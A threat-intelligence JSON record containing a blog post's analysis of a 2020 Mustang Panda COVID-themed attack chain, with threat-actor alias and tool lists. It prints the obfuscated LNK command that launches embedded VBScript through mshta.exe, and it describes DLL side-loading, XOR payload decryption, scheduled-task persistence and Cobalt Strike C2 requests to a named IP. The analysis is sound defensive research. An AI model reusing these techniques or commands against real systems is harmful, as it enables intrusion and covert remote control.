{
    "id": "2478de7f-4d63-4d29-937b-520aca6f40ee",
    "created_at": "2023-01-12T15:09:09.727853Z",
    "updated_at": "2025-03-27T02:16:47.074854Z",
    "deleted_at": null,
    "sha1_hash": "1d683b6ae94088f43839e829fe152541c195f1cd",
    "title": "2020-03-22 - Mustang Panda joins the COVID-19 bandwagon",
    "authors": "",
    "file_creation_date": "2022-05-28T04:00:46Z",
    "file_modification_date": "2022-05-28T04:00:46Z",
    "file_size": 704904,
    "plain_text": "# Mustang Panda joins the COVID-19 bandwagon\n\n**[malwareandstuff.com/mustang-panda-joins-the-covid19-bandwagon/](https://malwareandstuff.com/mustang-panda-joins-the-covid19-bandwagon/)**\n\n[Published by hackingump on March 22, 2020](https://malwareandstuff.com/author/klopsch/)\n\n\nMarch 22, 2020\n\n\nIn a time where Corona is all over the news, cyber criminals are also taking advantage of this\nsituation. Weeks ago I stumbled on a twitter post regarding the MustangPanda APT group\nand decided to take a look at it.\n\n\n-----\n\nTwitter\n\nstatus that started this blog post\n\n## Summary\n\nThe attack consists of multiple stages and it all starts with a LNK File which contains\nembedded HTML Code with a script tag carrying VBScript code.\n\nThe LNK file runs a command that executes the embedded code via mshta.exe. Afterwards\na decoy document and dropper are placed and executed on the system.\n\nThe Dropper drops 3 other files into the Public Music folder and persists tencentsoso.exe via\nthe task scheduler. Those files are all loaded into memory in order to execute code which\ncontacts the C2 server to download the final stage which is believed to be a Cobalt Strike\nPayload.\n\n**Stage 1 – LNK Dropper**\n\n\n-----\n\nBy looking at the properties of the LNK file we can find a malicious command entered into\nthe target property:\n```\n# raw\n%comspec% /c f%windir:~-3,1%%PUBLIC:~-9,1% %x in (%temp%=%cd%) do\nf%windir:~-3,1%%PUBLIC:~-9,1% /f \"delims==\" %i in ('dir \"%x\\02-21-1.lnk\" /s /b') do\nstart %TEMP:~-2,1%%windir:~-1,1%h%TEMP:~-13,1%%TEMP:~-7,1%.exe \"%i\"\n# beautified and pseudo code like\ncmd.exe /c for %x in (%temp%=%cd%)\n     do for /f \"delims==\" %i in ('dir %x\\02-21-1.lnk /s /b')\n          do start mshta.exe \"%i\"\n\n```\nTo simplify this, the command searches for the 02-21-1.lnk and executes it via mshta.exe.\n[Mshta.exe[1] is an executable on Windows that can be used to run HTML Applications. In](https://file.info/windows/mshta_exe.html)\nthis case it is used to run malicious VBScript code which is embedded in HTML Tags that\ncan be found in the LNK file.\n\n\n-----\n\nGraphic\n\nexplaining the lnk stage\nThe VBScript code opens a decoy document containing Chinese text, drops a PE executable\nand runs it. Here is the text translated into English:\n```\nTaiwanese deputy leader Chen Jianren recently wrote on Facebook that the\ncharacteristic of community transmission is that people walking in the community will\nbe infected, but Taiwan is not. Unexpectedly, the US Centers for Disease Control and\nPrevention listed on the 20th the destinations that are clearly at risk of \"community\ntransmission\", including Taiwan.\nTaiwan's \"Foreign Ministry\" demanded that the United States correct it. Many netizens\nridiculed that the authorities had never wanted to admit it, and as a result, \"Dad\ndirectly tags.\"\n\n```\n**Stage 2 – PE DROPPER**\n\nThe dropped file is a PE executable that serves as another dropper which contains a\nresource named “HELP”.\n\n\n-----\n\nPicture of\n\nResource Hacker showing the resource\nWhen executed, 3 files from the “HELP” resource are dropped into C:\\Users\\Public\\Music\nand schtasks.exe is run in order to achieve persistence on the system.\n\nDisassembly snippet of execution of schtasks.exe to persist one of the dropped files\n\ntencentsoso.exe is actually a real file from Tencent and at least part of the software Tencent\nSideBar. The DLL File here however is custom made and used to load the nsa binary file. I\nbelieve that the attackers are trying to trick victims here into believing that this is legit\nsoftware.\n\n**Stage 3 – Final PE File**\n\n\n-----\n\nOnce tencentsoso.exe is executed, it dynamically loads the SideBar.DLL. The DLL then\nreads the nsa file and decrypts it with a simple XORing, allocates memory via VirtualAlloc\nwith executable rights and writes the decrypted nsa content into executable memory.\nAfterwards it jumps to this executable content.\n\nDecrypting nsa and\n\ndynamically jump to decrypted part\nThe sample uses a Cobalt Strike feature known as malleable c2 and contacts its C2 server\n123.51.185.75 to download the next payload.\n```\nGET /jquery-3.3.1.slim.min.js HTTP/1.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nHost: code.jquery.com\nReferer: http://code.jquery.com/\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X)\nAppleWebKit/605.1.15 (KHTML, like Gecko)\nConnection: Keep-Alive\nCache-Control: no-cache\n\n```\nLooking at the response in Wireshark, it becomes clear that the attackers hide the payload in\nthe JQuery code. It reads the content of the file into a buffer, decrypts the code area and\njumps to the offset 0x1008 to start the next stage.\n\n\n-----\n\nHTTP\n\n\nResponse from C2 Server\n\ndecrypted payload in JQuery response\n\n\nStart of\n\n\n-----\n\nFrom here on the sample keeps sending HTTP requests to the C2 Server and waits for\ncommands:\n```\nGET /jquery-3.3.1.min.js HTTP/1.1\nHost: code.jquery.com\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nReferer: http://code.jquery.com/\nAccept-Encoding: gzip, deflate\nCookie:\n__cfduid=Z_FZubVJKboirizDP2zDYMDszubh4QhllqA5XPSeH2a5qAF0fLAjetJ4gIh5Gsr8WBWkWvD7w0y2z\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X)\nAppleWebKit/605.1.15 (KHTML, like Gecko)\nConnection: Keep-Alive\nCache-Control: no-cache\nHTTP/1.1 200 OK\nDate: Sun, 22 Mar 2020 08:24:59 GMT\nServer: NetDNA-cache/2.2\nContent-Length: 5543\nKeep-Alive: timeout=10, max=100\nConnection: keep-alive\nContent-Type: application/javascript; charset=utf-8\nCache-Control: max-age=0, no-cache\nPragma: no-cache\n\n```\n[This final stage is believed to be Cobalt Strike. Any.Run Sandbox also detects it[2].](https://any.run/report/a095924f6f0ed69914a36a8dbcd4f03d5040f61a3c107edb73a4dd7e0c18ad4b/1801ba3e-f3f8-4927-b6e3-3a6ec51d2418)\nBy looking at the traffic and doing some research, I found multiple posts that explain the way\n[Cobalt Strike hides payloads in HTTP responses, the most interesting one being this one[3].](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html)\n\n[Icon used were made by Pixel perfect from](https://www.flaticon.com/authors/pixel-perfect) [www.flaticon.com](http://www.flaticon.com/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-22 - Mustang Panda joins the COVID-19 bandwagon.pdf"
    ],
    "report_names": [
        "2020-03-22 - Mustang Panda joins the COVID-19 bandwagon.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1691c25f-1aa4-4168-8ce2-7aa8f23246e7",
            "created_at": "2024-06-04T02:03:07.724221Z",
            "updated_at": "2025-03-27T02:05:17.284601Z",
            "deleted_at": null,
            "main_name": "BRONZE PRESIDENT",
            "aliases": [
                "Mustang Panda ",
                "Red Lich ",
                "Temp.Hex ",
                "HoneyMyte "
            ],
            "source_name": "Secureworks:BRONZE PRESIDENT",
            "tools": [
                " Cobalt Strike",
                " ORat",
                " PlugX",
                " RCSession",
                "China Chopper"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b69037ec-2605-4de4-bb32-a20d780a8406",
            "created_at": "2023-01-06T13:46:38.790766Z",
            "updated_at": "2025-03-27T02:00:02.919758Z",
            "deleted_at": null,
            "main_name": "MUSTANG PANDA",
            "aliases": [
                "TEMP.HEX",
                "TA416",
                "TANTALUM",
                "Twill Typhoon",
                "Earth Preta",
                "Stately Taurus",
                "LuminousMoth",
                "Polaris",
                "BRONZE PRESIDENT",
                "HoneyMyte",
                "Red Lich"
            ],
            "source_name": "MISPGALAXY:MUSTANG PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9baa7519-772a-4862-b412-6f0463691b89",
            "created_at": "2022-10-25T15:50:23.354429Z",
            "updated_at": "2025-03-27T02:00:55.45162Z",
            "deleted_at": null,
            "main_name": "Mustang Panda",
            "aliases": [
                "Mustang Panda",
                "TA416",
                "RedDelta",
                "BRONZE PRESIDENT"
            ],
            "source_name": "MITRE:Mustang Panda",
            "tools": [
                "Cobalt Strike",
                "RCSession",
                "NBTscan",
                "PoisonIvy",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2ee03999-5432-4a65-a850-c543b4fefc3d",
            "created_at": "2022-10-25T16:07:23.882813Z",
            "updated_at": "2025-03-27T02:02:10.0116Z",
            "deleted_at": null,
            "main_name": "Mustang Panda",
            "aliases": [
                "Bronze President",
                "Camaro Dragon",
                "Earth Preta",
                "HoneyMyte",
                "Mustang Panda",
                "Operation SMUGX",
                "Operation SmugX",
                "PKPLUG",
                "Red Lich",
                "Stately Taurus",
                "TEMP.Hex"
            ],
            "source_name": "ETDA:Mustang Panda",
            "tools": [
                "9002 RAT",
                "AdFind",
                "Agent.dhwf",
                "Agentemis",
                "CHINACHOPPER",
                "China Chopper",
                "Chymine",
                "ClaimLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "DCSync",
                "DOPLUGS",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Farseer",
                "Gen:Trojan.Heur.PT",
                "HOMEUNIX",
                "Hdump",
                "HenBox",
                "HidraQ",
                "Hodur",
                "Homux",
                "HopperTick",
                "Hydraq",
                "Impacket",
                "Kaba",
                "Korplug",
                "LadonGo",
                "MQsTTang",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "NBTscan",
                "NetSess",
                "Netview",
                "Orat",
                "POISONPLUG.SHADOW",
                "PUBLOAD",
                "PVE Find AD Users",
                "PlugX",
                "Poison Ivy",
                "PowerView",
                "QMAGENT",
                "RCSession",
                "RedDelta",
                "Roarur",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Sogu",
                "TIGERPLUG",
                "TONEINS",
                "TONESHELL",
                "TVT",
                "TeamViewer",
                "Thoper",
                "TinyNote",
                "WispRider",
                "WmiExec",
                "XShellGhost",
                "Xamtrav",
                "Zupdax",
                "cobeacon",
                "nbtscan",
                "nmap",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536149,
    "ts_updated_at": 1743041807,
    "ts_creation_date": 1653710446,
    "ts_modification_date": 1653710446,
    "files": {
        "pdf": "https://archive.orkl.eu/1d683b6ae94088f43839e829fe152541c195f1cd.pdf",
        "text": "https://archive.orkl.eu/1d683b6ae94088f43839e829fe152541c195f1cd.txt",
        "img": "https://archive.orkl.eu/1d683b6ae94088f43839e829fe152541c195f1cd.jpg"
    }
}